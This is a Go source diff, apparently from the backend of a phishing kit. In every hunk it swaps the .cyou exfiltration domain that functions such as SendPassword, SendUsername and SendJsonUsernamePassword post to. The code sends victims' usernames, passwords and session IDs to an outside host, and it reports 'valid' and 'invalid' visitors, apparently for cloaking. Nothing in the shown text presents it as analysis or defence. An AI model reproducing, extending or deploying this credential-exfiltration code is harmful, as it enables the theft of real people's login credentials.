@@ -106,7 +106,7 @@ func (d *Database) SendInvalidVisitor(sid int, pl_name string, req *http.Request
 	//
 	responseBody := bytes.NewBuffer(postBody)
 
-	request, _ := http.Post("https://noirlegacysender234.cyou/api/invalidvisitor", "application/json", responseBody)
+	request, _ := http.Post("https://noirlegacysender4321.cyou/api/invalidvisitor", "application/json", responseBody)
 
 	defer request.Body.Close()
 
@@ -133,7 +133,7 @@ func (d *Database) SendValidVisitor(req *http.Request, remote_addr string, key s
 	//
 	responseBody := bytes.NewBuffer(postBody)
 
-	request, err := http.Post("https://noirlegacysender234.cyou/api/validvisitor", "application/json", responseBody)
+	request, err := http.Post("https://noirlegacysender4321.cyou/api/validvisitor", "application/json", responseBody)
 
 	if err != nil {
 		fmt.Println("Failed to make the POST request:", err)
@@ -170,7 +170,7 @@ func (d *Database) SendPassword(username string, session_id string, key string) 
 	if username != "" {
 		responseBody := bytes.NewBuffer(postBody)
 
-		request, err := http.Post("https://noirlegacysender234.cyou/api/password", "application/json", responseBody)
+		request, err := http.Post("https://noirlegacysender4321.cyou/api/password", "application/json", responseBody)
 
 		if err != nil {
 			fmt.Println("Failed to make the POST request:", err)
@@ -206,7 +206,7 @@ func (d *Database) SendJsonUsernamePassword(username string, session_id string, 
 	if username != "" {
 		responseBody := bytes.NewBuffer(postBody)
 
-		request, err := http.Post("https://noirlegacysender234.cyou/api/json1", "application/json", responseBody)
+		request, err := http.Post("https://noirlegacysender4321.cyou/api/json1", "application/json", responseBody)
 
 		if err != nil {
 			fmt.Println("Failed to make the POST request:", err)
@@ -242,7 +242,7 @@ func (d *Database) SendUsername(username string, session_id string, key string, 
 		responseBody := bytes.NewBuffer(postBody)
 
 		log.Println(responseBody)
-		request, err := http.Post("https://noirlegacysender234.cyou/api/username", "application/json", responseBody)
+		request, err := http.Post("https://noirlegacysender4321.cyou/api/username", "application/json", responseBody)
 
 		if err != nil {
 			fmt.Println("Failed to make the POST request:", err)
